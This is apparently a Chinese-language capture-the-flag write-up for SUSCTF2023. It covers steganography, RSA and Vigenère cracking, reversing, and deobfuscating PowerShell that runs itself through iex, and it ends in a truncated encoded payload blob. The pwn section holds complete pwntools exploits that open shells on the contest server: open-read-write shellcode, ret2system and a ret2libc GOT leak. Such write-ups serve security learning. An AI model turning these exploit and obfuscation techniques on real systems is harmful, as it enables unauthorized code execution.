","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:1:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 SUSTV 发现歌曲的最后一段时间有\"嘀嘀嘀\"的声响。 根据提示（SUSTV），使用MMSSTV，将音频使用虚拟声卡读入： 得到二维码，扫描得到flag： Are you a HAM? susctf{b7c55a86-56f4-4ebe-ba57-03d3cae609ea} ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:2:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 Do_u_know_Jeremiah_Denton? 尝试Mp3Stego、摩斯码、频谱、LSB（只支持wav）无解后，找到一种private_bit隐写方法（还是根据题目中醒目的private）。 原理是，mp3文件格式中有很多mf数组，每个数组中都有一个字段是private_bit，使private_bit为0或1可以使mp3携带额外信息。 观察mp3文件，发现mf数组从CCh处开始，但是发现mf[0]的长度异常，于是选择从mf[1]开始，也就是0x19c。 发现每个mf的大小并不相同（1a1h和1a2h），发现其中的padding_bit字段是否为1决定了mf的大小： 此时计算出padding_bit和private_bit的位置即可。padding前的比特数是12+1+2+1+4+2=22，也就是padding在第23位，private_bit在第24位。那么扔掉每个mf元素的前两个字节，取第三个字节的倒数第一、第二位分别是private_bit和padding_bit。 由于有padding的值，我们不需要计算没个mf元素的地址，只需要从第一个开始加上每个元素的大小即可偏移到后一个mf元素上去。 exp: import re n = 0x19c + 2 result = '' number = 0 file = open('QueenCard.mp3', 'rb') l = [] while n \u003c 0x2711a0: file.seek(n, 0) head = file.read(1) padding = '{:08b}'.format(ord(head))[-2] result += '{:08b}'.format(ord(head))[-1] if padding == \"0\": n += 0x1a1 else: n += 0x1a2 file.seek(n, 0) #print(result) flag = '' textArr = re.findall('.{' + str(8) + '}', result) for i in textArr: flag = flag + chr(int(i, 2)).strip('\\n') print(flag) 这里开始的n加2是因为要扔掉前两个字符。最后使用正则表达式确定flag的位置。结果如下： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:3:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x04 百团（改） 首先扫描二维码发现unicode加密内容，解密后为当铺密码：士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大 使用脚本解密后，发现是16进制对应的ascii码： dh = '田口由中人工大土士王夫井羊壮天' ds = '001234555678996' cip = '士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大' s = '' for i in cip: if i in dh: s += ds[dh.index(i)] else: s += ' ' print(s) # 53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75 解密后为：SUS #4y w31c0#e u 此时直接交上去是不对的，于是考虑png隐写。 使用010打开发现png结尾有PK头，于是给foremost解密： foremost half.png 生成的output文件夹如下： 直接解压zip，发现需要密码。 能想到的只有SUS #4y w31c0#e u，填入解得另一半flag： flag为： susctf{SUS #4y w31c0#e u_join us!} ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:4:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x05 Can_u_find_meeeeee? 猜测藏匿了字符串。 使用everything软件，进入题目所在文件夹，填入content:sus，等待一会儿，发现： 根据题目can u find me，答案可能在.me中。打开后搜索susctf，找到： 但是感觉内容不大对劲，有点像base加密。解密后得： 加上susctf{}即为答案。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:5:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x06 AI-keras.Model.summary() 首先用010看一下文件， 发现头部是HDF，于是使用HDFView打开： 这里显示是乱的，整理了好久，发现010中也能找到： flag为： susctf{have_fun_with_deep_conv_net} ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:6:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x07 算术！ 根据算术编码的过程进行解码： 给定概率是：0.438875 第一次在第一个区间，于是第一个字母是a。 将第一个区间等比例扩大到1，分段为：0-0.25-0.4-0.4- 0.5 发现在第三个区间，第二个字母为l。 将第三个区间等比例扩大到1，分段为：0.4 -0.425-0.44-0.445-0.45 发现在第2个区间，第三个字母为o。 将第二个区间等比例扩大到1，前三段分段为：0.425-0.4325-0.437-0.4385 此时已经确定第四个字母是h（0.4388 \u003e 0.4385） 最后一个个字符所在区间为下一级的第一个区间： 0.4385-0.44425，即为a。 综上：flag为susctf{aloha} Crypto ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:7:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 Signin 这题如果直接尝试求D的话会发现e和phi并不互质。 但是这里发现e和q-1是互质的，同时我们知道，在c不是p或q的倍数的情况下： m = c ^ d mod n ==\u003e m = c ^ d mod p m = c ^ d mod q 于是可以这样求明文： d = invert(e,q-1) m = pow(c,d,q) exp： from Crypto.Util.number import * import gmpy2 n= 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953 p= 95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657 q= n // p c= 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661 e= 31531 phi = (q-1) print(gmpy2.gcd(e,phi)) d = gmpy2.invert(e,phi) m = pow(c,d,q) print(long_to_bytes(m)) 答案为： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:8:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 Vigenere 根据题目，得知是维吉尼亚密码： import re from secret import flag, key assert re.match(r\"^susctf\\{[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}\\}$\", flag) assert re.match(r\"^[a-z]{10}$\", key) def encrypt(msg, key): key, msg = key.lower(), msg.lower() res = \"\" k_i = 0 for i in range(len(msg)): if not msg[i].isalpha(): res += msg[i] continue c = msg[i] k = key[k_i % len(key)] res += chr((ord(c) + ord(k) - 2 * ord('a')) % 26 + ord('a')) #维吉尼亚密码 k_i += 1 return res print(encrypt(flag, key)) ''' ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146} ''' 通过和维吉尼亚密码表对照，得知前六位是qkxjuk 接着发现题目以正则表达式的形式给出了flag的形式，同时知道密码是10位小写字母，那么我们就可以爆破后四位密码（每次用flag的正则检查即可）。 exp: import re def decrypt(encrypted_flag, key): key, encrypted_flag = key.lower(), encrypted_flag.lower() decrypted_flag = \"\" k_i = 0 for i in range(len(encrypted_flag)): if not encrypted_flag[i].isalpha(): decrypted_flag += encrypted_flag[i] continue c = encrypted_flag[i] k = key[k_i % len(key)] decrypted_flag += chr((ord(c) - ord(k) + 26) % 26 + ord('a')) k_i += 1 return decrypted_flag known_key_prefix = \"qkxjuk\" encrypted_flag = \"ieplnp{bhtnr6m3-04bm-41w3-lg78-c040377ys146}\" flag_regex = re.compile(r\"^susctf\\{[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}\\}$\") for i in range(26): for j in range(26): for k in range(26): for l in range(26): possible_key = known_key_prefix + chr(97 + i) + chr(97 + j) + chr(97 + k) + chr(97 + l) decrypted_flag = decrypt(encrypted_flag, possible_key) if flag_regex.match(decrypted_flag): print(f\"Found a matching key: {possible_key}\") print(f\"Decrypted flag: {decrypted_flag}\") 结果为： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:9:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 ezMath 根据(https://math.stackexchange.com/questions/402537/find-integer-in-the-form-fracabc-fracbca-fraccab)中的讨论，发现当且仅当n为偶数的时候有解。 这里给出了n \u003c= 10的所有整数解，这里直接使用N=10的情况： n=10: a=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347; b=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977; c=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209. log2(a+b+c)≈630.265; log10(a+b+c)≈189.729 填入后就得到flag： Pwn ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:10:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 orw 根据题目，大概能猜出是orw类型的题目（只能使用open、read和write）。先checksec： 只开了Canary，同时发现栈上可以RWX，于是考虑将shellcode直接写入栈上。 ida64打开，第一眼就看到了沙箱： 再看看溢出点： 发现直接read了0x100，但是buf在rbp上0x80，可以直接栈溢出。 同时发现最后直接call rax，而rax是buf的地址。那我们这里直接将shellcode读入buf就可以执行。下面是open read write的代码： #open /flag push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall #read(rax,rsp,100h) mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall #write(1,rsp,100h) mov edi,1 mov rsi,rsp push 1 pop rax syscall 直接发送shellcode即可。 exp： from ae64 import AE64 from pwn import * context.arch='amd64' context.os='linux' shellcode = asm(''' push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall ''') r = remote('game.ctf.seusus.com',28380) #gdb.attach(r) r.recvuntil(b'shellcode:') r.send(shellcode) r.interactive() ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:11:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 random 发现保护全开，一看就不像是栈溢出的题目。 ida64，发现： 我们只需要得到v5，再和-889275714求异或即可。 发现v5是一个随机数，但是它甚至没有设置种子，那么我们只需要和题目链接到同一个libc中，取出rand()的结果就可以。 如何取出rand()，当然是用ctypes，可以直接使用C语言中的函数，我们取出rand后将其和-889275714异或后发送即可（由于没设种子，这题可以不用pwntool） exp: from pwn import * from ctypes import * context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64', os = 'linux') context.log_level='debug' elf = ELF('./random') libc = cdll.LoadLibrary('libc.so.6') r = remote('game.ctf.seusus.com',32552) #r = elf.process() v5 = libc.rand() r.recvuntil(b'mind?') res = v5 ^ -889275714 r.sendline(str(res)) r.interactive() ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:12:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 bof buffer overflow 首先checksec： 只开了栈不可执行，没什么特别的。 ida进，发现溢出点： 非常朴实无华，这时候就去找函数了，发现有system也有/bin/sh，于是直接ret2system了。这里64位要注意参数放在rdi里，还有栈平衡的问题。 栈平衡很简单，在ROP链前面加上一个ret就行了，rdi的话得去ROPgadget： 找到了。这里顺便把ret的地址记一下，栈平衡的时候要用。 exp: from pwn import * context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64', os = 'linux') context.log_level='debug' elf = ELF('./bof') r = remote('game.ctf.seusus.com',29689) #r = elf.process() system = elf.sym['system'] bin_sh = 0x601048 pop_rdi = 0x400793 ret = 0x40053e #溢出0x20 + 8 payload = cyclic(0x28) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system) r.recvuntil(b'Say something?\\n') r.send(payload) r.interactive() ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:13:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x04 ezROP checksec看一下： 开了栈不可执行，但是是32位的（好久没看到32位的题目了） 开ida，发现溢出函数： 这里直接运行会多出一个wrong，因为wrong!和Say something: 是连着的。不过没有什么影响。 这里read了100h字节，存在栈溢出。但是system和/bin/sh都没有找到。 那么思路就很清楚了，由于write执行过一次，根据lazy binding的机制可以直接使用write打印出GOT表中write的真实地址。通过这个真实地址就可以找到libc的版本。再减去Libc中write的offset就可以得到libc的基址，那么加上system和/bin/sh的偏移，就可以getshell。 这里我选择手动查询Libc地址。首先连接远程泄露write的地址： r= remote('game.ctf.seusus.com',46494) write_plt = elf.plt['write'] write_got = elf.got['write'] vul = 0x804850c payload = cyclic(0x6c + 4) + p32(write_plt) + p32(vul) + p32(1) + p32(write_got) + p32(4) r.recvuntil(b'wrong') r.send(payload) leak = u32(r.recv(4)) info(hex(leak)) 得到的结果是: 然后使用libc database search，找到对应的两个库文件： （经过尝试，第二个是正确的库文件） 这里将write，system和bin_sh的地址直接记下来计算真实地址： libc_base = leak - 0x0e57f0 system_addr = libc_base + 0x03cf10 bin_sh_addr = libc_base + 0x17b9db payload = cyclic(0x6c + 4) + p32(system_addr) + b'a' * 4 + p32(bin_sh_addr) r.recvuntil(b'wrong') r.send(payload) r.interactive() 成功getshell： 完整的exp: from pwn import * context(arch='i386',os='linux') context.log_level = 'debug' elf = ELF('./ezROP') libc = ELF('/lib/i386-linux-gnu/libc.so.6') #r = elf.process() r= remote('game.ctf.seusus.com',46494) write_plt = elf.plt['write'] write_got = elf.got['write'] vul = 0x804850c payload = cyclic(0x6c + 4) + p32(write_plt) + p32(vul) + p32(1) + p32(write_got) + p32(4) r.recvuntil(b'wrong') r.send(payload) leak = u32(r.recv(4)) info(hex(leak)) libc_base = leak - 0x0e57f0 system_addr = libc_base + 0x03cf10 bin_sh_addr = libc_base + 0x17b9db payload = cyclic(0x6c + 4) + p32(system_addr) + b'a' * 4 + p32(bin_sh_addr) r.recvuntil(b'wrong') r.send(payload) r.interactive() Reverse ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:14:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 signin 首先查壳，发现32位无壳。 使用ida打开，如下图所示： 发现输入的是32位字符串（应该就是flag）。加密的逻辑很简单：先将除了最后一位的每一位和下一位进行异或，然后每隔两位将其和后半段的对应字符交换（直接说的话太抽象了，但是代码很好看明白）。 于是，解密的逻辑直接反着来就行。先交换，因为再用同样的办法交换一次就可以交换回原位置，所有交换的代码不用改动。接下来异或。这里我们发现由于加密是buf[i] = buf[i] ^ buf[i + 1]，buf的最后一位并没有被操作过，那么要得到原来的buf[i]，就得从最后一位向前用buf[i+1]和buf[i]异或。 将41f000处的32个字符进行解密即可。依据上面的思路，代码如下所示： #include \u003ciostream\u003e using namespace std; char a[] = {0x6c,0x41,0x1,0x3,0x26,0x68,0x41,0x59,0x39,0x6a,0x42,0x4,0x26,0x6b,0x45,0x31,0x44,0x7,0x7,0x4c,0x68,0x2d,0x5f,0x6c,0x4,0x56,0x6e,0x2d,0x6a,0x49,0x5a,0x75}; int main() { for (int i = 0;i \u003c 16;i+=2) { char tmp = a[i]; a[i] = a[i+16]; a[i+16] = tmp; } for (int i = 31;i \u003e 0;i--) { a[i-1] = a[i] ^ a[i-1]; } for (int i = 0;i \u003c 32;i++) cout \u003c\u003c a[i]; return 0; } 结果如下： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:15:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 babyPowerShell ('w'+(\"{0}{1}\" -f 'yes','us')+'c'+'tf'+'{Pow'+(\"{1}{0}{2}\" -f'shel','er','l')+'_'+'i'+(\"{0}{1}\"-f'sss','s')+'ss'+(\"{2}{0}{1}\" -f 's','sss_v','ss')+(\"{1}{2}{0}\"-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you}'+(\"{1}{0}\" -f 'zZRout','wye')+(\"{0}{1}\"-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)|.( $EnV:COMsPEC[4,26,25]-JoiN'') 这里发现最后的管道符连接着一个( $EnV:COMsPEC[4,26,25]-JoiN’’)，经过直接执行后发现是iex命令。查看资料和发现，iex会直接将输入当作命令执行。因此我们看不到字符的输出。这里我们需要将其去掉，去掉之后，为了输出后面的字符（应该很容易看出来前面是字符的加加减减），在开头加入write-output再执行脚本。 write-output ('w'+(\"{0}{1}\" -f 'yes','us')+'c'+'tf'+'{Pow'+(\"{1}{0}{2}\" -f'shel','er','l')+'_'+'i'+(\"{0}{1}\"-f'sss','s')+'ss'+(\"{2}{0}{1}\" -f 's','sss_v','ss')+(\"{1}{2}{0}\"-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you}'+(\"{1}{0}\" -f 'zZRout','wye')+(\"{0}{1}\"-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34) 执行结果如下： 开始时没发现这个out-null哈哈哈似乎也需要去掉，但是还好不影响输出答案。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:16:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 PowerShell 这题就复杂多了。只能从能入手的地方入手（题目太长，不放进来了） 首先从开头的地方就可以发现两个加密：一个是Base64，一个是deflatestream。虽然第二个加密不太了解，但是发现cyberchef上有相应的解密过程。 接着就是一大堆加密后的文字。在文件最后还有这些命令： [IO.comPResSIoN.coMpReSsiONmoDe]::DeComPrESs )| %{New-ObjEct Io.StrEamreadEr( $_ ,[SysTem.Text.ENcODiNg]::AsCIi)}).ReadtOEND( ) |\u0026((gV '*MDr*').nAME[3,11,2]-JoIn'') 这里只看出来是ascii加密，还有一个iex，前面的不清楚有什么用处。反正iex要删掉的，我决定先去看看加密的地方有什么。 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